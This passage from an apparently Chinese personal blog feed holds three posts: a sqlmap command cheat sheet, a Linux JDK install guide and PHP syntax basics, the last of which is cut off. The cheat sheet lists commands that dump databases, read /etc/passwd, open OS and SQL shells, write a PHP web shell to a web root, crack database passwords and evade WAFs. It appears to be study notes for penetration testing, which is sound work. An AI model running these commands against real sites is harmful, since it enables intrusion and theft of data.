    <content type="html"><![CDATA[<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><ul><li><p>1.<strong>-u url</strong>    检测url是否存在注入</p></li><li><p>2.<strong>-u url  –dbs</strong> 获取所有的库名</p></li></ul><ul><li>3.<strong>-u url  –current-db</strong> 获取当前库名</li></ul><ul><li><p>4.<strong>-u url -D pikachu –table</strong> 获取指定库pikachu的表名</p></li><li><p>5.<strong>-u url -D pikachu -T member –columns</strong> 获取指定库pikachu的member表中的字段名</p></li><li><p>6.<strong>-u url -D pikachu -T member -C username,pw,id –dump</strong> 获取指定字段的数据</p></li><li><p>7.<strong>-u url -D pikachu –dump-all</strong> 获取整个数据库的数据</p></li><li><p>8.<strong>-u url -D pikachu -T member -C username,pw,id –dump –start=1 –stop=5</strong>  获取指定字段的5条数据</p></li><li><p>9.<strong>-u url –purge</strong> 清除缓存进行注入</p></li><li><p>10.<strong>-u url –privileges</strong> 测试所有数据库用户的权限（写文件/操作数据库）</p></li><li><p>11.<strong>-u url –os-cmd=’cat /etc/passwd’ –purge</strong> 执行系统命令cat /etc/passwd</p></li><li><p>12.**-u url –batch **当出现选项的时候，自动填充默认选项</p></li><li><p>13.**-u url –os-shell **返回半交互式命令执行终端</p></li><li><p>14.<strong>-u url –data “uname=1&amp;passwd=1” –batch</strong> 默认跑uname</p></li><li><p>15.**-u url –data “uname=1&amp;passwd=1” –batch -p passwd **指定passwd参数进行测试是否存在sql注入</p></li><li><p>16.<strong>-r 1.txt</strong>(包含http请求的数据包文件)</p></li><li><p>17.**-u url –users –passwords **查询数据库中的用户名以及密码并进行爆破</p></li><li><p>18.**-u url –level 3 **测试更多http部分 3 ua-referer 2-cookie 1-get/post</p></li><li><p>19.<strong>-u url –risk 3</strong> 1-3 三个等级 使用更多的payload进行测试是否存在sql注入</p></li><li><p>20.<strong>-u url -v 3 payload</strong>以及调试信息    0-6 7个等级 </p></li><li><p>21.**-u url –is-dba **测试当前连接数据库用户是否为dba权限</p></li><li><p>22.**-u url –current-db –current-user **显示当前数据库和用户</p></li><li><p>23.**-m url.txt –batch **批量检测url </p></li><li><p>24.**–cookie=”phpsession=asidisjiajsd9291i39i2;uname=admin” –dbs –level 3 –data **</p></li><li><p>*”seachid=123&amp;username=qqq” ** 指定cookie测试注入</p></li><li><p>25.**–random-agent **随机提取ua头进行测试</p></li><li><p>26.**–referer=”<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a> **指定referer进行测试</p></li><li><p>27.<strong>–time-sec 5 –delay 0.5  –technique=T</strong></p></li><li><p>28.<strong>-u url –sql-query=”select database()”</strong></p></li><li><p>29.<strong>-u url –sql-shell #mysql-shell</strong></p></li><li><p>30.<strong>-u url –sql-file=”sql文件”</strong></p></li><li><p>31.**-u url –file-read ‘/etc/passwd’**读取文件</p></li><li><p>32.**-u url –file-write “1.txt” –file-dest “/var/www/html/shell666.php” **写文件</p></li><li><p>33.**-g “google dork” –batch –random-agent –delay 0.5 –threads 2 –dbs **指定google语法搜索url进行注入</p></li><li><p>34.<strong>–dbms=mysql</strong> 指定数据库为mysql</p></li><li><p>35.**–technique=’BEUSTQ’ **指定sqlmap使用注入技术进行注入</p></li><li><p>36.**–technique=’T’ –time-sec 1 **指定盲注技术进行注入，并指定休眠时间为1s</p></li><li><p>37.**–delay 0.5 **指定sqlmap发送数据包的间隔时间为0.5s</p></li><li><p>38.**sqlmap -l logfile burp—&gt; project options -&gt; misc -&gt; logging **选择不同的模块的req/resp存入日志文件内</p></li><li><p>39.<strong>-u url –force-ssl</strong> 强制走https</p></li><li><p>40.**-u url –chunked **分块传输发送payload测试sql注入绕waf</p></li><li><p>41.**–threads 5 **指定5个线程注入 进程/线程</p></li><li><p>42.**–prefix **添加前缀 #闭合</p><pre><code>    **--suffix **添加后缀   #注释</code></pre></li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>1.<strong>sqlmap -u url –random-agent –delay 0.5 –threads 2 –time-sec 2 –batch sqlmap -u url –safe-url=”<a href="http://url&quot;/">http://url&quot;</a></strong> </p></li><li><p>2.<strong>sqlmap -u url –prefix=”)]” –no-cast –dbs</strong></p></li><li><p>3.<strong>sqlmap -u <a href="https://url/">https://url</a> –force-ssl</strong> </p></li><li><p>4.<strong>sqlmap -u url –tammper=space2comment.py</strong></p></li><li><p>5.<strong>–time-sec 5</strong>指定时间盲注的时间5s</p></li><li><p>6.<strong>–delay 0.5</strong>指定sqlmap每个数据包发包间隔为0.5s</p></li><li><p>7.<strong>–technique=T/E/U/S/B</strong><br>  T = time 时间盲注<br>  E = error 报错注入<br>  U = union 联合查询<br>  S = stacks 堆叠注入<br>  B = Bool    布尔盲注</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础命令&quot;&gt;&lt;a href=&quot;#基础命令&quot; class=&quot;headerlink&quot; title=&quot;基础命令&quot;&gt;&lt;/a&gt;基础命令&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1.&lt;strong&gt;-u url&lt;/strong&gt;    检测url是否存在注入&lt;/p&gt;
&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    
    <category term="sql注入" scheme="https://bstark.me/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>linux 安装包安装：JDK</title>
    <link href="https://bstark.me/posts/63374/"/>
    <id>https://bstark.me/posts/63374/</id>
    <published>2022-01-10T12:54:52.000Z</published>
    <updated>2022-01-21T03:51:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>1）：官方下载对应的.gz包，这里以jdk-8u181-linux-x64.tar.gz为例<br>2）：创建一个目录用于存放解压后的文件，并解压缩到该目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/lib/jvm</span><br><span class="line">sudo tar -zxvf jdk-8u181-linux-x64.tar.gz -C /usr/lib/jvm</span><br></pre></td></tr></table></figure><p>3）：修改环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure><p>4）：文件末尾追加如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/jdk1.8.0_181  <span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span>  </span><br></pre></td></tr></table></figure><p>5）：使环境变量生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>6）：设置默认jdk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_181/bin/java 300  </span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_181/bin/javac 300  </span><br><span class="line">sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_181/bin/jar 300   </span><br><span class="line">sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_181/bin/javah 300   </span><br><span class="line">sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_181/bin/javap 300</span><br></pre></td></tr></table></figure><p>7）：执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure><p>8）：测试是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1）：官方下载对应的.gz包，这里以jdk-8u181-linux-x64.tar.gz为例&lt;br&gt;2）：创建一个目录用于存放解压后的文件，并解压缩到该目录下&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
    <category term="linux" scheme="https://bstark.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>php基础语法</title>
    <link href="https://bstark.me/posts/54224/"/>
    <id>https://bstark.me/posts/54224/</id>
    <published>2022-01-08T12:54:52.000Z</published>
    <updated>2022-01-11T14:34:08.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="三种标签"><a href="#三种标签" class="headerlink" title="三种标签"></a>三种标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>  <span class="meta">?&gt;</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> %&gt; <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//手动添加改短标签php.ini  phort_ipen_tag:on asp_tag:on</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="number">123</span>;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span> <span class="meta">?&gt;</span>  <span class="comment">//大部分网站可用    </span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&quot;我是scriptphp&quot;</span>&lt;/script&gt;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span> </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">  hhhhhh</span></span><br><span class="line"><span class="string">EOF</span>?</span><br><span class="line">    &gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span>       </span><br><span class="line">var_dump   <span class="comment">//输出变量类型</span></span><br><span class="line">print_r    <span class="comment">//打印数组</span></span><br><span class="line">printf</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;dd&quot;</span>) <span class="comment">//退出的意思</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h2><ul><li><p>变量以$开头</p></li><li><p>系统变量以$_GET开头</p></li><li><p>变量区分大小写</p></li><li><p>变量名只能字母或者下划线开头</p></li><li><p>赋值变量可不必声明变量的数据类型</p></li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>递增递减运算</p><ul><li>只能用于变量</li></ul><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x$</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">$x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x$</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">$x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table><table><thead><tr><th>运算符</th><th>名称</th><th>等同于</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>$x==$y</td><td>如果$x等于$y,返回true</td></tr><tr><td>===</td><td>全等于（完全相同）</td><td>$x===$y</td><td>如果$x等于$y,且类型相同返回true</td></tr><tr><td>!=</td><td>不等于</td><td>$x!=$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>&lt;&gt;</td><td>不等于</td><td>$x&lt;&gt;$y</td><td>如果$x不等于$y,返回true</td></tr><tr><td>!==</td><td>不全等（属性和值都不等于）</td><td>$x!==$y</td><td>如果$x不等于$y,且类型不相同返回true</td></tr><tr><td>&gt;</td><td>大于</td><td>$x&gt;$y</td><td>如果$x大于$y,返回true</td></tr><tr><td>&lt;</td><td>小于</td><td>$x&lt;$y</td><td>如果$x小于$y,返回true</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>$x&gt;=$y</td><td>如果$x大于等于$y,返回true</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>$x&lt;=$y</td><td>如果$x小于等于$y,返回true</td></tr><tr><td>and,&amp;&amp;</td><td>与</td><td>$x and$y</td><td>如果$x和$y都为true，则返回true</td></tr><tr><td>or,||</td><td>或</td><td>$x or $y</td><td>如果$x和$y至少1个为true，则返回true</td></tr><tr><td>not,!</td><td>非</td><td>!$x</td><td>如果$x不为true，则返回true</td></tr><tr><td>xor</td><td>异或</td><td>$x xor $y</td><td>如果$x和$y有且仅有1个为true，则返回true</td></tr></tbody></table><h2 id="数组的创建和读取"><a href="#数组的创建和读取" class="headerlink" title="数组的创建和读取"></a>数组的创建和读取</h2><p>创建数组的基本方法是应用array()函数</p><ul><li>索引数组  key为连续的整数，默认从下标0开始。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr2</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">2</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr2</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sizeof(<span class="variable">$arr</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br><span class="line"><span class="keyword">echo</span> count(<span class="variable">$arr2</span>);  <span class="comment">//返回数组的长度(元素的个数)</span></span><br></pre></td></tr></table></figure><ul><li>关联数组  key为指定的值，通常为字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="keyword">array</span>(<span class="string">&#x27;bill&#x27;</span>=&gt;<span class="number">35</span>,<span class="string">&#x27;steve&#x27;</span>=&gt;<span class="number">37</span>,<span class="string">&#x27;peter&#x27;</span>=&gt;<span class="number">43</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]  <span class="comment">//获取数组</span></span><br><span class="line"><span class="variable">$age</span>[<span class="number">0</span>] </span><br><span class="line"><span class="comment">//索引赋值</span></span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;bill&#x27;</span>]=<span class="number">35</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;steve&#x27;</span>]=<span class="number">37</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;peter&#x27;</span>]=<span class="number">43</span>;</span><br></pre></td></tr></table></figure><ul><li>多维数组</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="string">&quot;f&quot;</span>), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>][<span class="number">1</span>];  <span class="comment">//二维数组，输出= b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">             <span class="keyword">array</span>(<span class="string">&#x27;e&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)), </span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">2</span>][<span class="number">1</span>][<span class="number">3</span>];<span class="comment">//多维数组，输出 = 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="数组的基本操作"><a href="#数组的基本操作" class="headerlink" title="数组的基本操作"></a>数组的基本操作</h2><ul><li>通过赋值增加数组元素</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;age&quot;</span>=&gt;<span class="string">&quot;25&quot;</span>)</span><br><span class="line"><span class="variable">$b</span>[<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bb&quot;</span>    </span><br></pre></td></tr></table></figure><ul><li>通过使用array_push()函数追加数组元素(入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>);</span><br><span class="line">array_push(<span class="variable">$a</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br></pre></td></tr></table></figure><ul><li>通过使用array_pop()函数删除最后一个数组元素出入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">array_pop(<span class="variable">$a</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br><span class="line"><span class="comment">//结果为 &quot;red&quot;,&quot;green&quot;</span></span><br></pre></td></tr></table></figure><ul><li>数组的排序</li></ul><table><thead><tr><th>排序函数</th><th>作用</th><th>属性</th></tr></thead><tbody><tr><td>sort()</td><td>以升序对数组排序</td><td>基本排序</td></tr><tr><td>rsort()</td><td>以降序对数组排序</td><td>基本排序</td></tr><tr><td>ksort()</td><td>根据键值，以升序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>krsort()</td><td>根据键值，以降序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>asort()</td><td>根据值，以升序对关联数组进行排序</td><td>值排序</td></tr><tr><td>arsort()</td><td>根据值，以降序对关联数组进行排序</td><td>值排序</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>);</span><br><span class="line"><span class="variable">$arr2</span> = sort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);    <span class="comment">//排序后在arr，不在arr2,arr2只会输出true、false</span></span><br></pre></td></tr></table></figure><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><ul><li><strong>if 语句</strong> - 在条件成立时执行代码</li><li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li><li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li><li><strong>switch case 语句</strong> - 在若干条件之一成立时执行一个代码块</li></ul><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li><li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li><li><strong>for</strong> - 循环执行代码块指定的次数</li><li><strong>foreach($array as $value)</strong> - 根据数组中每个元素来循环代码块    ps：js里用的是 for in</li></ul><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><ul><li><p>常量值被定义后，在脚本的其他任何地方都不能被改变。</p></li><li><p>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p></li><li><p>设置常量，使用 define() 函数，函数语法如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> BB;    <span class="comment">// 输出 &quot;hello dashuaibi!&quot;  不需带$符号可直接调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 不区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 不报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li>形参实参</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;    <span class="comment">//形参</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> *<span class="number">5</span>+<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;在函数内：&quot;</span>.<span class="variable">$m</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;            <span class="comment">//实参</span></span><br><span class="line">bb(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;在函数外：&quot;</span>.<span class="variable">$m</span>   </span><br></pre></td></tr></table></figure><ul><li>默认参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$n</span>=<span class="string">&quot;1&quot;</span></span>)</span>&#123;    <span class="comment">//默认值参数</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> +<span class="variable">$n</span>;</span><br><span class="line">&#125;</span><br><span class="line">bb(<span class="number">5</span>,<span class="number">6</span>); <span class="comment">//给两个可选参数赋值后，则覆盖参数默认值</span></span><br><span class="line">bb(<span class="number">5</span>);  <span class="comment">//没有给可选参数赋值，默认为1</span></span><br></pre></td></tr></table></figure><h2 id="自定全局变量"><a href="#自定全局变量" class="headerlink" title="自定全局变量"></a>自定全局变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myfunction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">        <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">myfunction();</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure><h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h2><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>strlen</td><td>计算字符串的长度</td><td>strlen(变量名)</td></tr><tr><td>substr</td><td>截取字符串，采用起点一长度方式</td><td>substr(string 源字符串,int start[,int length])</td></tr><tr><td>strstr</td><td>截取字符串，采用子串一结尾方式</td><td>strstr(string 原串，string标识)</td></tr><tr><td>explode</td><td>分割字符串，将字符串毁成数组</td><td>explode(string separator,string string [,int limit])</td></tr><tr><td>trim</td><td>去掉左右空格</td><td>trim (string 字符串)</td></tr><tr><td>md5</td><td>计算字符串的MD5哈希（加密）</td><td>md5 (string 字符串)</td></tr><tr><td>mb_strlen()</td><td>计算中文字符串的长度</td><td>strlen(变量名)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-string.html">https://www.runoob.com/php/php-ref-string.html</a></p><h2 id="常用变量函数"><a href="#常用变量函数" class="headerlink" 